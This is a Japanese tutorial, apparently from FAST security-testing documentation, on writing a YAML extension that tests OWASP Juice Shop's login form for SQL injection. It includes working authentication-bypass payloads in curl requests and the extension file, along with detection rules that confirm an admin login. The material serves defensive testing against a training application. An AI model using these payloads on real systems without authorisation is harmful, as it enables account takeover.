[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project



#   変更を行わない拡張の作成

本ドキュメントで説明する拡張は、受信ベースラインリクエストを変更してペイロードを挿入することはしません。代わりに、ベースラインリクエストで指定されたホストに対して、あらかじめ定義された2つのテストリクエストを送信します。これらのテストリクエストには、対象アプリケーション[「OWASP Juice Shop」][link-juice-shop]のログインフォームに存在するSQLiの脆弱性を悪用し得るペイロードが含まれています。


##  準備

FAST拡張を作成する前に、[対象アプリケーションの挙動を調査する][link-app-examination]ことを強く推奨します。


##  拡張の作成

拡張を記述するファイル（例: `non-mod-extension.yaml`）を作成し、必要なセクションを記述します。

1.  [**`meta-info`セクション**][link-meta-info]。

    拡張が検出しようとする脆弱性の説明を用意します。
    
    * 脆弱性ヘッダー：`OWASP Juice Shop SQLi (non-mod extension)`
    * 脆弱性の説明：`Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * 脆弱性タイプ：SQLインジェクション
    * 脅威レベル：高
    
    該当する`meta-info`セクションは次のようになります。
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`send`セクション、[Sendフェーズ][doc-send-phase]**

    対象アプリケーションのSQLインジェクション脆弱性を悪用するには、`email`パラメータの値として次の2つのペイロードを、任意の`password`値とともに送信します。
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    それぞれ次を含むテストリクエストを2つ作成できます。
    
    * 上記のいずれかの値を持つ`email`パラメータ
    * 任意の値を持つ`password`パラメータ

    このサンプルの対象アプリケーション（OWASP Juice Shop）をテストするには、これらのリクエストのうち1つだけを使用すれば十分です。
    
    ただし、実アプリケーションのセキュリティテストでは、複数の準備済みテストリクエストを用意しておくと有用です。あるリクエストがアプリケーションの更新や改善により脆弱性を悪用できなくなっても、他のペイロードを用いる別のリクエストが引き続き脆弱性を悪用できる可能性があるためです。

    上記の最初のペイロードを用いたリクエストは次のようになります。
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    2つ目のリクエストも同様です。

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    これら2つのテストリクエストの記述を含む`send`セクションを追加します。
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "`Host`ヘッダーに関する注意" 
        このSQLi脆弱性の悪用には影響しないため、これらのリクエストでは`Host`ヘッダーを省略できます。FASTノードは、受信ベースラインリクエストから抽出した`Host`ヘッダーを自動的に追加します。
        
        [こちら][link-send-headers]で、Sendフェーズがリクエストヘッダーをどのように扱うかをご確認ください。

     3.  **`detect`セクション、[Detectフェーズ][doc-detect-phase]**。
    
    次の条件を満たす場合、管理者権限でのユーザー認証が成功したことを示します。
    
    * レスポンスボディに、値が`1`のショッピングカート識別子パラメータが存在すること。パラメータはJSON形式で、次のようになります。
    
        ```
        "bid":1
        ```
    
    * レスポンスボディに、値が`admin@juice-sh.op`のユーザーメールアドレスパラメータが存在すること。パラメータはJSON形式で、次のようになります。
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    上記の条件に基づいて攻撃の成否を確認する`detect`セクションを追加します。
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "特殊記号のエスケープ"
    文字列中の特殊記号をエスケープすることを忘れないでください。

##  拡張ファイル

これで`non-mod-extension.yaml`ファイルには、拡張が動作するために必要なセクション一式が揃いました。ファイルの内容は次のとおりです。

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  拡張の使用

作成した拡張の使い方の詳細については、[このドキュメント][link-using-extension]をご覧ください。